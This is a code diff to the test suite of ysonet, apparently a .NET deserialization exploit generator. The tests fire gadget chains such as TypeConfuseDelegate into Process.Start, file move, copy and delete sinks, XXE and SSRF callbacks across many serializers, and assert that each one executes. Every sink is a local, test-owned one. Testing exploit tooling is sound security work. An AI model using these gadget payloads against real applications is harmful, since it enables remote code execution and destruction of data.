+            FireGadgetMarker("GenericIdentity", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GenericIdentity", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GenericIdentity", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: GenericPrincipal SoapFormatter, both variants, raw and minified.
+            // GenericPrincipal's BinaryFormatter cell is covered by bfMarkerGadgets membership
+            // above. SoapFormatter was added on top of BF/Los: unlike ClaimsPrincipal (whose
+            // fields are [OptionalField]), GenericPrincipal has required own fields (m_identity,
+            // m_roles), so its SOAP payload must carry all four members. Variant 1 fires through
+            // ClaimsPrincipal.DeserializeIdentities; variant 2 fires through the nested
+            // ClaimsIdentity.DeserializeClaims. The inner is TypeConfuseDelegate, which fires
+            // Process.Start then throws a cast error AFTER firing; the marker is the proof.
+            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 1, false, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 1, true, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 2, false, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("GenericPrincipal", "SoapFormatter", 2, true, false, "soap", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: FormsIdentity across its OTHER advertised formatters. Its
+            // BinaryFormatter cell (raw and minified) is covered by bfMarkerGadgets membership
+            // above. FormsIdentity (System.Web) reaches the ClaimsIdentity nested-BF sink through
+            // five formatters: BF and Los use the hand-built System.Web NRBF stream; Soap uses the
+            // percent-encoded nsassem namespace; DCS and NDCS import ClaimsIdentity as a base data
+            // contract (member m_serializedClaims). The inner is TFRP (fires then throws a cast
+            // AFTER firing); the marker is the proof. Each cell fires through DeserializeClaims.
+            FireGadgetMarker("FormsIdentity", "SoapFormatter", 0, false, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "SoapFormatter", 0, true, false, "soap", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "LosFormatter", 0, false, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "LosFormatter", 0, true, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "DataContractSerializer", 0, false, false, "dcs", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "DataContractSerializer", 0, true, false, "dcs", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("FormsIdentity", "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: DataContract serializers for the field-based ClaimsIdentity family.
+            // ClaimsIdentity, GenericIdentity, ClaimsPrincipal and GenericPrincipal each import
+            // ClaimsIdentity/ClaimsPrincipal as a data contract, so DCS and NDCS carry the inner
+            // BF payload in m_serializedClaims / m_serializedClaimsIdentities and fire through the
+            // OnDeserialized callback. DCS uses the self-describing root/type wrapper; NDCS uses
+            // z:Type/z:Assembly. (DataContractJsonSerializer needs the root type supplied out of
+            // band, so it is fired by DataContractJsonFiresForClaimsFamily instead.)
+            foreach (string g in new[] { "ClaimsIdentity", "GenericIdentity", "ClaimsPrincipal", "GenericPrincipal" })
+            {
+                FireGadgetMarker(g, "DataContractSerializer", 0, false, false, "dcs", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker(g, "DataContractSerializer", 0, true, false, "dcs", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker(g, "NetDataContractSerializer", 0, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker(g, "NetDataContractSerializer", 0, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
+            }
 
             // ---- MARKER: DataTable carrier across its OTHER advertised formatters.
             // Unlike the BF-only siblings above, DataTable advertises BinaryFormatter,
@@ -4862,6 +8304,56 @@ namespace ysonet.Tests
             FireGadgetMarker("DataTable", "BinaryFormatter", 2, true, false, "bf", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("DataTable", "LosFormatter", 2, false, false, "los", true, failures, ref fired, ref skipped, trace);
             FireGadgetMarker("DataTable", "LosFormatter", 2, true, false, "los", true, failures, ref fired, ref skipped, trace);
+
+            // ---- MARKER: TypeConfuseDelegate root-container variants 2 (SortedDictionary)
+            // and 3 (TreeSet). Variant 1 is covered by bfMarkerGadgets membership (raw above,
+            // minified below). These two keep the same Comparison<string> -> Process.Start
+            // splice but reach it through a different serialized root, so every advertised
+            // formatter must be proven to still execute, raw and minified. The comparer is
+            // called back while the container rebuilds; the gadget then throws on the confused
+            // return value, so the marker file is the proof. Any cell that does not fire is a
+            // real bug, never a skip.
+            foreach (int tcdVariant in new[] { 2, 3 })
+            {
+                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, false, false, "bf", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, true, false, "bf", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, false, false, "los", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, true, false, "los", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
+                // --minify --ust is the combination that routes variant 1 into the hardcoded
+                // NRBF stream. Variants 2 and 3 take the normal Serialize() path there, so
+                // fire that path too rather than assuming it matches the plain minified one.
+                FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", tcdVariant, true, true, "bf", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", tcdVariant, true, true, "los", true, failures, ref fired, ref skipped, trace);
+                FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", tcdVariant, true, true, "ndc", true, failures, ref fired, ref skipped, trace);
+            }
+            // Variant 1's own NetDataContractSerializer and LosFormatter cells, so the full
+            // advertised set is fired for every container, not just for the two new ones.
+            FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", 1, false, false, "ndc", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("TypeConfuseDelegate", "NetDataContractSerializer", 1, true, false, "ndc", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, false, false, "los", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, true, false, "los", true, failures, ref fired, ref skipped, trace);
+            // The two hardcoded --minify --ust NRBF paths (BinaryFormatter and LosFormatter)
+            // are variant 1 only; fire them so the gated block stays proven to execute.
+            FireGadgetMarker("TypeConfuseDelegate", "BinaryFormatter", 1, true, true, "bf", true, failures, ref fired, ref skipped, trace);
+            FireGadgetMarker("TypeConfuseDelegate", "LosFormatter", 1, true, true, "los", true, failures, ref fired, ref skipped, trace);
+
+            // ---- FILE SINKS: TypeConfuseDelegateFileOperations. Its effect is not a
+            // spawned process but a real file-system change made in-process by the
+            // deserializer, so the sink is a test-owned file or directory rather than a
+            // marker command. Every operation x every advertised formatter x every
+            // serialized root x minify off/on is fired and the effect asserted, because the
+            // spliced method and the argument order are what this gadget is.
+            FireFileOperations(failures, ref fired, trace);
+
+            // ---- FILE SINKS: TempFileCollection. The effect is a DELETE performed
+            // in-process by the deserialized object itself, through its finalizer or through
+            // an explicit Dispose(), so there is no marker command and no spawned process.
+            // Both paths are fired for every advertised formatter, raw and minified, into a
+            // test-owned directory that also holds a sentinel file the payload must leave
+            // alone.
+            FireTempFileCollectionDeletes(failures, ref fired, trace);
 
             // Conditional MARKER (self-skip, not fail):
             // - WindowsClaimsIdentity needs a non-GAC assembly (Microsoft.IdentityModel, a
@@ -4928,6 +8420,14 @@ namespace ysonet.Tests
             // both compressed and compressed+minify (the minified form is what a user ships).
             FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, false, true);
             FireSelfClosingCs("DataSetOldBehaviourFromFile", failures, ref fired, ref skipped, trace, true, true);
+            // XamlAssemblyLoadFromFile through the two alternate roots of its
+            // TypeConfuseDelegate wrapper. The XAML must still reach XamlReader.Parse and
+            // Assembly.Load + run the compiled type when the SortedSet is swapped for a
+            // SortedDictionary or a TreeSet.
+            FireSelfClosingCs("XamlAssemblyLoadFromFile", " --rootcontainer 2", "c2_", " (--rootcontainer 2)",
+                failures, ref fired, ref skipped, trace);
+            FireSelfClosingCs("XamlAssemblyLoadFromFile", " --rootcontainer 3", "c3_", " (--rootcontainer 3)",
+                failures, ref fired, ref skipped, trace);
 
             // ---- Plugin MARKER via each plugin's own -t self-test path. ----
             FirePluginMarker("Altserialization", new[] { "-M", "HttpStaticObjectsCollection" }, failures, ref fired, trace);
@@ -4944,21 +8444,42 @@ namespace ysonet.Tests
             // resolver), so fire it via a subprocess self-test rather than in-process.
             FireResxCompiledSubprocess(failures, ref fired, ref skipped, trace);
 
-            // ---- TEMPDIR: NetNonRce FileLogTraceListener creates a directory on deserialize,
-            // for all three formatter payloads (the JSON/XML input-escaping fix makes the Json.NET
-            // and JavaScriptSerializer paths honour a Windows path with backslashes too). ----
-            foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
-                FireNetNonRceTempDir(fmt, failures, ref fired, trace);
-            // Xaml --minify: the newly minified Xaml path must still fire (not just be smaller).
-            FireNetNonRceTempDir("Xaml", true, failures, ref fired, trace);
-
             // ---- LISTENER: SSRF/callback payloads connect to a loopback capture proxy. ----
             foreach (string gadget in new[] { "PictureBox", "InfiniteProgressPage" })
             {
-                foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
+                var formatters = new List<string> { "Json.NET", "FastJson", "JavaScriptSerializer", "YamlDotNet", "SharpSerializerXml", "Xaml" };
+                if (gadget == "PictureBox")
+                {
+                    formatters.Add("MessagePackTypeless");
+                    formatters.Add("MessagePackTypelessLz4");
+                }
+                foreach (string fmt in formatters)
+                {
                     FireNetNonRceListener(gadget, fmt, failures, ref fired, trace);
-                FireNetNonRceListener(gadget, "Xaml", true, failures, ref fired, trace);
+                    FireNetNonRceListener(gadget, fmt, true, failures, ref fired, trace);
+                }
             }
+
+            // ---- TEMPDIR: FileLogTraceListener creates the supplied directory on
+            // deserialize. Its own sink, so nothing outside the test tree is touched.
+            foreach (string fmt in new[] { "Json.NET", "JavaScriptSerializer", "Xaml" })
+                FireFileLogTraceListenerTempDir(fmt, false, failures, ref fired, trace);
+            // Xaml --minify: the minified payload must still create the directory.
+            FireFileLogTraceListenerTempDir("Xaml", true, failures, ref fired, trace);
+
+            // ---- LEGACY XML: DataViewManagerXxe fetches an external DTD, but only where the
+            // pre-4.5.2 XML resolver defaults are in force, so every cell runs in a child
+            // process stamped with the target framework under test.
+            foreach (string fmt in new[] { "Xaml", "JavaScriptSerializer", "FastJson", "SharpSerializerXml", "SharpSerializerBinary" })
+            {
+                FireDataViewManagerXxe(fmt, false, true, failures, ref fired, ref skipped, trace);
+                FireDataViewManagerXxe(fmt, true, true, failures, ref fired, ref skipped, trace);
+            }
+            // Hardened-default control: the same payload must do nothing on a 4.5.2+ target.
+            // One representative text formatter and the binary one.
+            FireDataViewManagerXxe("Xaml", false, false, failures, ref fired, ref skipped, trace);
+            FireDataViewManagerXxe("SharpSerializerBinary", false, false, failures, ref fired, ref skipped, trace);
+            LegacyXmlChild.Cleanup();
 
             // ObjectDataProvider variant 3 is the xamlurl SSRF variant: it fetches the URL on load.
             FireOdpXamlUrlListener(failures, ref fired, trace);
@@ -4972,27 +8493,436 @@ namespace ysonet.Tests
                 + string.Join("\n  ", failures.ToArray()));
         }
 
-        private static void FireNetNonRceTempDir(string formatter, List<string> failures, ref int fired, bool trace)
+        // What this run proved about runtime version support. Every fire above records
+        // its gadget, so a FULL run IS the evidence for the version facet: these
+        // payloads did their job on the build named here. Run it right after the
+        // matrix, while that record is fresh.
+        //
+        // Two rules, and only one of them fails the build:
+        //  - a gadget that fired while claiming versions this build sits OUTSIDE and
+        //    BELOW (or claiming only another runtime family) contradicts what just
+        //    happened, so it fails; and
+        //  - a gadget that fired on a build NEWER than its recorded ceiling, or that
+        //    claims nothing at all, is only under-documented. Both are reported, not
+        //    failed: a contributor on a newer framework than the last recorded run
+        //    must not get a red build for it.
+        private static void VersionEvidenceMatchesThisRuntime()
         {
-            FireNetNonRceTempDir(formatter, false, failures, ref fired, trace);
+            string build = RuntimeBuild.Token();
+            Console.Error.WriteLine("  [info] fired on " + RuntimeBuild.Describe());
+
+            if (!RuntimeBuild.AnythingFired())
+            {
+                Console.Error.WriteLine("  [skip] VersionEvidenceMatchesThisRuntime: nothing fired "
+                    + "(the execution matrix is FULL-tier, so a NORMAL run has no evidence to check)");
+                return;
+            }
+            if (build == null)
+            {
+                Console.Error.WriteLine("  [skip] VersionEvidenceMatchesThisRuntime: this host does not "
+                    + "report a .NET Framework build, so a fire proves nothing about a version");
+                return;
+            }
+
+            var contradictions = new List<string>();
+            var couldDeclare = new List<string>();
+            var couldExtend = new List<string>();
+            int buildIndex = RuntimeVersion.IndexOf(build);
+
+            foreach (string gadget in RuntimeBuild.FiredGadgets())
+            {
+                IGenerator g = GadgetRegistry.CreateGadgetInstance(gadget);
+                if (g == null)
+                    continue;
+
+                List<string> declared = VersionsOf(g);
+                if (declared.Contains(RuntimeVersion.Unspecified))
+                {
+                    couldDeclare.Add(gadget);
+                    continue;
+                }
+                if (declared.Contains(build))
+                    continue;
+
+                // Declared, but not this build. Newer than everything it claims is new
+                // evidence to write down; anything else is a claim this run just broke.
+                int highestClaimed = -1;
+                foreach (string v in declared)
+                {
+                    if (!string.Equals(RuntimeVersion.Family(v), RuntimeVersion.Family(build), StringComparison.Ordinal))
+                        continue;
+                    int i = RuntimeVersion.IndexOf(v);
+                    if (i > highestClaimed)
+                        highestClaimed = i;
+                }
+
+                if (highestClaimed >= 0 && buildIndex > highestClaimed)
+                    couldExtend.Add(gadget + " (recorded up to "
+                        + GadgetFacetReader.Label(RuntimeVersion.All[highestClaimed]) + ")");
+                else
+                    contradictions.Add(gadget + " fired on " + GadgetFacetReader.Label(build)
+                        + " but declares " + GadgetFacetReader.VersionSummary(declared));
+            }
+
+            if (couldDeclare.Count > 0)
+            {
+                Console.Error.WriteLine("  [info] fired here but declare no runtime version yet ("
+                    + couldDeclare.Count + "): " + string.Join(", ", couldDeclare.ToArray()));
+                Console.Error.WriteLine("  [info] each can declare up to " + GadgetFacetReader.Label(build)
+                    + "; pick the lower bound from the documented introduction version.");
+            }
+            if (couldExtend.Count > 0)
+                Console.Error.WriteLine("  [info] this build is newer than what these record, so their upper bound "
+                    + "can be raised to " + GadgetFacetReader.Label(build) + ": "
+                    + string.Join(", ", couldExtend.ToArray()));
+
+            AssertTrue(contradictions.Count == 0,
+                "a payload fired on a build its own metadata excludes, so the claim is wrong:\n  "
+                + string.Join("\n  ", contradictions.ToArray()));
         }
 
-        private static void FireNetNonRceTempDir(string formatter, bool minify, List<string> failures, ref int fired, bool trace)
+        // Every version any unit of the gadget declares, for one readable message.
+        private static List<string> VersionsOf(IGenerator g)
         {
-            string label = "NetNonRce FileLogTraceListener " + formatter + (minify ? " --minify" : "");
-            string dir = Path.Combine(Path.GetTempPath(), "ysonet_firedir_" + formatter.Replace(".", "") + (minify ? "_min" : ""));
+            var all = new List<string>();
+            foreach (GadgetCapability cap in GadgetFacetReader.Expand(g))
+                foreach (string v in cap.Versions)
+                    if (!all.Contains(v))
+                        all.Add(v);
+            return all;
+        }
+
+        // Every TypeConfuseDelegateFileOperations cell, fired for real into test-owned
+        // files and directories: 5 operations x 3 formatters x 3 serialized roots x
+        // minify off/on. There is no marker command and no spawned process here - the
+        // deserializer itself performs the file operation - so the effect is asserted
+        // synchronously right after the deserialize instead of polled for.
+        //
+        // Fixture names carry the ordering rule: the FIRST argument must sort after the
+        // second with String.CompareOrdinal, so sources/targets start "zz_" and
+        // destinations start "aa_". Nothing here rewrites those names; the generator
+        // refuses any pair that does not already satisfy the rule.
+        private static void FireFileOperations(List<string> failures, ref int fired, bool trace)
+        {
+            string root = TestArtifactPath("ysonet_fileops_fire");
+            SafeDeleteDir(root);
+            Directory.CreateDirectory(root);
+            string contentFile = Path.Combine(root, "content.txt");
+            // Minify-SAFE body: no carriage return, no trailing whitespace, no "; ". Those
+            // are the three things the XML minifier rewrites, and the gadget refuses to
+            // build a minified NetDataContractSerializer payload that would be rewritten
+            // (proven separately by FileOperationsRefuseLossyMinification and by the
+            // expected-failure cell in the generation matrix). Here the point is that every
+            // cell FIRES, so the fixture stays inside what all three formatters can carry.
+            File.WriteAllText(contentFile, "!ysonet fire fixture\nsecond line");
+
+            try
+            {
+                foreach (string formatter in FileOpsFormatters)
+                {
+                    string tag = FileOpsDeserTag(formatter);
+                    for (int container = 1; container <= 3; container++)
+                    {
+                        foreach (bool minify in new[] { false, true })
+                        {
+                            string cell = " -f " + formatter + " --rootcontainer " + container
+                                + (minify ? " --minify" : "");
+                            string stem = tag + "_c" + container + (minify ? "_min" : "");
+                            if (trace)
+                            {
+                                Console.Error.WriteLine("    [fire] " + FileOpsGadget + cell);
+                                Console.Error.Flush();
+                            }
+                            FireFileOpsWrite(root, contentFile, stem, formatter, container, minify, cell, failures, ref fired);
+                            FireFileOpsCopy(root, stem, formatter, container, minify, cell, failures, ref fired);
+                            FireFileOpsMove(root, stem, formatter, container, minify, cell, failures, ref fired);
+                            FireFileOpsDirMove(root, stem, formatter, container, minify, cell, failures, ref fired);
+                            FireFileOpsEmpty(root, stem, formatter, container, minify, cell, failures, ref fired);
+                        }
+                    }
+                }
+            }
+            finally { SafeDeleteDir(root); }
+        }
+
+        // Generate one cell and deserialize it. Returns false (and records the failure)
+        // when generation itself did not succeed, so the caller can skip its assertions.
+        private static bool FireFileOpsCell(int variant, string cmd, string formatter,
+            int container, bool minify, string label, List<string> failures)
+        {
+            RunResult r = GenerateFileOps(variant, cmd, formatter, container, minify);
+            if (!r.Success)
+            {
+                failures.Add("fire " + label + ": generation failed: " + r.ErrorMessage);
+                return false;
+            }
+            byte[] payload = Bytes(r.Raw);
+            // The operation runs inside the container's deserialization callback; the
+            // comparer then returns a confused value, so a throw AFTER the effect is
+            // normal and RunSTA swallows it. The file system is the assertion.
+            RunSTA(delegate { DeserializeAs(FileOpsDeserTag(formatter), payload); });
+            return true;
+        }
+
+        private static void FireFileOpsWrite(string root, string contentFile, string stem,
+            string formatter, int container, bool minify, string cell, List<string> failures, ref int fired)
+        {
+            string label = "TCDFileOps write" + cell;
+            string target = Path.Combine(root, "zz_write_" + stem + ".txt");
+            SafeDelete(target);
+            if (!FireFileOpsCell(1, target + ";" + contentFile, formatter, container, minify, label, failures))
+                return;
+            string expected = File.ReadAllText(contentFile);
+            if (!File.Exists(target))
+                failures.Add("fire " + label + ": the target file was not written");
+            else if (File.ReadAllText(target) != expected)
+                failures.Add("fire " + label + ": the target text does not match the local content file");
+            else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
+            SafeDelete(target);
+        }
+
+        private static void FireFileOpsCopy(string root, string stem, string formatter,
+            int container, bool minify, string cell, List<string> failures, ref int fired)
+        {
+            string label = "TCDFileOps copy" + cell;
+            string source = Path.Combine(root, "zz_copy_" + stem + ".txt");
+            string dest = Path.Combine(root, "aa_copy_" + stem + ".txt");
+            SafeDelete(source); SafeDelete(dest);
+            File.WriteAllText(source, "copied by ysonet");
+            if (FireFileOpsCell(2, source + ";" + dest, formatter, container, minify, label, failures))
+            {
+                if (!File.Exists(source))
+                    failures.Add("fire " + label + ": File.Copy must leave the source in place");
+                else if (!File.Exists(dest))
+                    failures.Add("fire " + label + ": the destination copy was not created");
+                else if (File.ReadAllText(dest) != "copied by ysonet")
+                    failures.Add("fire " + label + ": the copy does not hold the source content");
+                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
+            }
+            SafeDelete(source); SafeDelete(dest);
+        }
+
+        private static void FireFileOpsMove(string root, string stem, string formatter,
+            int container, bool minify, string cell, List<string> failures, ref int fired)
+        {
+            string label = "TCDFileOps move" + cell;
+            string source = Path.Combine(root, "zz_move_" + stem + ".txt");
+            string dest = Path.Combine(root, "aa_move_" + stem + ".txt");
+            SafeDelete(source); SafeDelete(dest);
+            File.WriteAllText(source, "moved by ysonet");
+            if (FireFileOpsCell(3, source + ";" + dest, formatter, container, minify, label, failures))
+            {
+                if (File.Exists(source))
+                    failures.Add("fire " + label + ": the source file was not moved away");
+                else if (!File.Exists(dest))
+                    failures.Add("fire " + label + ": the destination file was not created");
+                else if (File.ReadAllText(dest) != "moved by ysonet")
+                    failures.Add("fire " + label + ": the moved file does not hold the source content");
+                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
+            }
+            SafeDelete(source); SafeDelete(dest);
+        }
+
+        private static void FireFileOpsDirMove(string root, string stem, string formatter,
+            int container, bool minify, string cell, List<string> failures, ref int fired)
+        {
+            string label = "TCDFileOps dirmove" + cell;
+            string source = Path.Combine(root, "zz_dir_" + stem);
+            string dest = Path.Combine(root, "aa_dir_" + stem);
+            SafeDeleteDir(source); SafeDeleteDir(dest);
+            Directory.CreateDirectory(source);
+            File.WriteAllText(Path.Combine(source, "inside.txt"), "child");
+            if (FireFileOpsCell(4, source + ";" + dest, formatter, container, minify, label, failures))
+            {
+                if (Directory.Exists(source))
+                    failures.Add("fire " + label + ": the source directory was not moved away");
+                else if (!File.Exists(Path.Combine(dest, "inside.txt")))
+                    failures.Add("fire " + label + ": the moved directory does not carry its child file");
+                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
+            }
+            SafeDeleteDir(source); SafeDeleteDir(dest);
+        }
+
+        private static void FireFileOpsEmpty(string root, string stem, string formatter,
+            int container, bool minify, string cell, List<string> failures, ref int fired)
+        {
+            string label = "TCDFileOps empty" + cell;
+            string target = Path.Combine(root, "zz_empty_" + stem + ".txt");
+            SafeDelete(target);
+            // Pre-create it with content, so this also proves the TRUNCATE half, not just
+            // the create half.
+            File.WriteAllText(target, "this content must be truncated away");
+            if (FireFileOpsCell(5, target, formatter, container, minify, label, failures))
+            {
+                if (!File.Exists(target))
+                    failures.Add("fire " + label + ": the target file is missing");
+                else if (new FileInfo(target).Length != 0)
+                    failures.Add("fire " + label + ": the existing file was not truncated to zero bytes");
+                else { fired++; RuntimeBuild.RecordFired(FileOpsGadget); }
+            }
+            SafeDelete(target);
+        }
+
+        // Every TempFileCollection cell, fired for real: 4 formatters x minify off/on x the
+        // two cleanup paths the framework offers (the finalizer and an explicit Dispose), so
+        // 16 cells. No marker command and no spawned process - the deserialized object deletes
+        // the file itself - so the assertion is synchronous and needs no wall-clock budget.
+        //
+        // Every payload names exactly ONE file inside this test's own directory. A sentinel
+        // file sits next to it and must survive, which is what proves the payload deletes what
+        // it was given and nothing else.
+        private static void FireTempFileCollectionDeletes(List<string> failures, ref int fired, bool trace)
+        {
+            string root = TestArtifactPath("ysonet_tfc_fire");
+            SafeDeleteDir(root);
+            Directory.CreateDirectory(root);
+            try
+            {
+                foreach (string formatter in TempFilesFormatters)
+                {
+                    foreach (bool minify in new[] { false, true })
+                    {
+                        string stem = TempFilesDeserTag(formatter) + (minify ? "_min" : "");
+                        FireTempFilesCell(root, stem, formatter, minify, true, failures, ref fired, trace);
+                        FireTempFilesCell(root, stem, formatter, minify, false, failures, ref fired, trace);
+                    }
+                }
+            }
+            finally { SafeDeleteDir(root); }
+        }
+
+        private static void FireTempFilesCell(string root, string stem, string formatter,
+            bool minify, bool viaFinalizer, List<string> failures, ref int fired, bool trace)
+        {
+            string label = TempFilesGadget + " -f " + formatter + (minify ? " --minify" : "")
+                + (viaFinalizer ? " (finalizer)" : " (Dispose)");
+            string suffix = stem + (viaFinalizer ? "_gc" : "_dispose");
+            string target = Path.Combine(root, "target_" + suffix + ".txt");
+            string sentinel = Path.Combine(root, "sentinel_" + suffix + ".txt");
+            if (trace) { Console.Error.WriteLine("    [fire] " + label); Console.Error.Flush(); }
+            try
+            {
+                File.WriteAllText(target, "this file must be deleted by the payload");
+                File.WriteAllText(sentinel, "this file must survive");
+
+                // Only the target path goes into the payload. Never the sentinel, and never
+                // anything outside root.
+                RunResult r = GenerateTempFiles(formatter, minify, false, target);
+                if (!r.Success)
+                {
+                    failures.Add("fire " + label + ": generation failed: " + r.ErrorMessage);
+                    return;
+                }
+
+                if (viaFinalizer)
+                {
+                    // The deserialized object must become unreachable for its finalizer to
+                    // run, so the deserialize happens in a separate non-inlined frame that
+                    // returns ONLY a WeakReference. A dead weak reference afterwards is what
+                    // makes the deletion attributable to the finalizer.
+                    WeakReference weak = DeserializeTempFileCollectionAndDrop(formatter, r.Raw);
+                    GC.Collect();
+                    GC.WaitForPendingFinalizers();
+                    GC.Collect();
+                    if (weak.IsAlive)
+                    {
+                        failures.Add("fire " + label + ": the deserialized object was still "
+                            + "reachable after a full collection, so its finalizer never ran");
+                        return;
+                    }
+                }
+                else
+                {
+                    DisposeDeserializedTempFileCollection(formatter, r.Raw);
+                }
+
+                if (File.Exists(target))
+                    failures.Add("fire " + label + ": the target file was not deleted");
+                else if (!File.Exists(sentinel))
+                    failures.Add("fire " + label + ": the sentinel file was deleted too, so the "
+                        + "payload removed more than the one path it was given");
+                else { fired++; RuntimeBuild.RecordFired(TempFilesGadget); }
+            }
+            catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
+            finally { SafeDelete(target); SafeDelete(sentinel); }
+        }
+
+        // Deserialize the payload and let the object go, returning only a WeakReference to it.
+        // NoInlining keeps the caller from holding a live reference in its own frame, which
+        // would keep the object off the finalizer queue and make the cell look like a payload
+        // that did not fire.
+        [System.Runtime.CompilerServices.MethodImpl(
+            System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
+        private static WeakReference DeserializeTempFileCollectionAndDrop(string formatter, object raw)
+        {
+            return new WeakReference(DeserializeTempFileCollection(formatter, raw));
+        }
+
+        // The deterministic half of the same effect: IDisposable.Dispose reaches the same
+        // Delete() and then suppresses the finalizer itself, so nothing is left queued.
+        [System.Runtime.CompilerServices.MethodImpl(
+            System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
+        private static void DisposeDeserializedTempFileCollection(string formatter, object raw)
+        {
+            object obj = DeserializeTempFileCollection(formatter, raw);
+            IDisposable disposable = obj as IDisposable;
+            if (disposable == null)
+                throw new Exception("the deserialized " + (obj == null ? "null" : obj.GetType().Name)
+                    + " is not IDisposable");
+            disposable.Dispose();
+        }
+
+        private static object DeserializeTempFileCollection(string formatter, object raw)
+        {
+            switch (TempFilesDeserTag(formatter))
+            {
+                case "bf": return SerializersHelper.BinaryFormatter_deserialize(Bytes(raw));
+                case "soap": return SerializersHelper.SoapFormatter_deserialize(Text(raw));
+                case "los": return SerializersHelper.LosFormatter_deserialize(Bytes(raw));
+                case "ndc": return SerializersHelper.NetDataContractSerializer_deserialize(Text(raw));
+                // Plain DataContractSerializer carries no type information, so the root type
+                // travels in the project's <root type="..."> envelope and the consumer reads it
+                // from there - exactly what a real target does with its own fixed root type.
+                case "dcs": return SerializersHelper.DataContractSerializer_deserialize(
+                    Text(raw), null, "root", "type");
+                default: throw new Exception("no deserializer for " + formatter);
+            }
+        }
+
+        // FileLogTraceListener's effect is a created DIRECTORY, so the sink is a temp
+        // dir under the test artifact folder rather than a marker file. The gadget's
+        // own self-test (inputArgs.Test) does the deserialize, exactly as the CLI
+        // would with -t, and the directory is removed again in the finally.
+        private static void FireFileLogTraceListenerTempDir(string formatter, bool minify,
+            List<string> failures, ref int fired, bool trace)
+        {
+            string label = "FileLogTraceListener " + formatter + (minify ? " --minify" : "");
+            string dir = TestArtifactPath("ysonet_firedir_" + formatter.Replace(".", "") + (minify ? "_min" : ""));
             SafeDeleteDir(dir);
             if (trace) { Console.Error.WriteLine("    [fire] " + label + " (tempdir)"); Console.Error.Flush(); }
             try
             {
-                var argv = minify
-                    ? new[] { "-g", "FileLogTraceListener", "-f", formatter, "-i", dir, "-t", "--minify" }
-                    : new[] { "-g", "FileLogTraceListener", "-f", formatter, "-i", dir, "-t" };
-                IPlugin p = PluginRegistry.CreatePluginInstance("NetNonRceGadgets");
-                ResetPluginStatics(p == null ? null : p.GetType());
-                RunSTA(delegate { PayloadRunner.RunPlugin("NetNonRceGadgets", argv); });
-                bool ok = WaitForDir(dir, 3000);
-                if (ok) fired++;
+                InputArgs input = new InputArgs();
+                input.Cmd = dir;
+                input.Minify = minify;
+                input.Test = true;
+                RunResult result = null;
+                RunSTA(delegate
+                {
+                    result = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = "FileLogTraceListener",
+                        FormatterName = formatter,
+                        InputArgs = input,
+                    });
+                });
+                if (result == null || !result.Success)
+                {
+                    failures.Add("fire " + label + ": generation failed: "
+                        + (result == null ? "no result" : result.ErrorMessage));
+                    return;
+                }
+                if (WaitForDir(dir, MarkerWaitMs)) { fired++; RuntimeBuild.RecordFired("FileLogTraceListener"); }
                 else failures.Add("fire " + label + ": directory not created");
             }
             catch (Exception ex) { failures.Add("fire " + label + ": " + ex.Message); }
